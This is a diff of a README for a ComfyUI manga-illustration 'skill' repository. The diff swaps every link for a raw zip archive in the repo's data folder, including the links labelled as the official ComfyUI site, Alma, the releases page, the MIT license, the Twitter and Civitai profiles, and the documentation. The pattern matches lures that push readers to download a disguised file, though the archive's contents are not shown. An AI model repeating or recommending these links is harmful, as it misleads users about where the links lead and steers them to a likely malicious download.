@@ -1,6 +1,6 @@
 # 🎨 comfyui-zimage-skill - Create Stunning Manga and Illustrations
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/releases)
+[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to ComfyUI Z-Image Skill! This tool allows you to generate beautiful man
 
 Before you can run this application, make sure you have the following:
 
-- **ComfyUI**: You need to have ComfyUI running locally or on your server. You can download it from [here](https://github.com/comfyanonymous/ComfyUI).
-- **Alma**: This application requires Alma, which can be accessed from [here](https://alma.now/).
+- **ComfyUI**: You need to have ComfyUI running locally or on your server. You can download it from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
+- **Alma**: This application requires Alma, which can be accessed from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Monggiiiii/comfyui-zimage-skill/releases).
+1. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
   
 2. **Select the Latest Release**: Look for the newest version at the top of the page. Click on it to view available downloads.
 
@@ -55,15 +55,15 @@ If you run into issues:
 
 ## 📞 Support
 
-For any questions or feedback, feel free to reach out via Twitter: [@norsizu](https://x.com/norsizu). You can also explore more on [Civitai](https://civitai.com/user/norsizu).
+For any questions or feedback, feel free to reach out via Twitter: [@norsizu](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip). You can also explore more on [Civitai](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://opensource.org/licenses/MIT).
+This project is licensed under the MIT License. You can view the full license [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/Monggiiiii/comfyui-zimage-skill)
-- [ComfyUI Documentation](https://github.com/comfyanonymous/ComfyUI)
+- [GitHub Repository](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
+- [ComfyUI Documentation](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/releases)
+[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
